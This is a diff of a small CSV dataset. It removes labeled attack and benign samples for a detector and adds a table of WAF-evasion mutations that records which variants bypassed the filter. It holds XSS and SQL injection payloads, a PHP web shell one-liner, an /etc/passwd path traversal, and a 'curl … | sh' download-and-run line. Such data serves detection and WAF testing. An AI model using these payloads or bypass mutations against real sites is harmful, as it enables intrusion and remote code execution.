@@ -1,16 +1,5 @@
-payload,label
-"<script>alert('XSS')</script>",1
-"' OR '1'='1' --",1
-"<?php system($_GET['cmd']); ?>",1
-"../../../../etc/passwd",1
-"GET /admin HTTP/1.1",1
-"<img src=x onerror=alert('xss')>",1
-"' UNION SELECT NULL,NULL--",1
-"curl http://malicious.site/shell.sh | sh",1
-"127.0.0.1 - - [12/Dec/2023:12:34:56] 'GET /index.html HTTP/1.1' 200",0
-"Normal login POST /login.php",0
-"Regular traffic - accessing home page",0
-"GET /product?id=1234 HTTP/1.1",0
-"Browsing static content - /images/logo.png",0
-"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",0
-"POST /search?q=test HTTP/1.1",0
+original_payload,response_code,response_size,response_contains,mutated_payload,waf_detected,success
+<script>alert(1)</script>,403,1300,blocked,<img src=x onerror=alert(1)>,1,0
+<img src=x onerror=alert(1)>,200,1920,success,<svg onload=alert(1)>,0,1
+' OR 1=1 --,403,1400,forbidden,"'/**/OR/**/1=1--",1,0
+<iframe src=javascript:alert(1)>,200,2100,loaded,<object data=javascript:alert(1)>,0,1
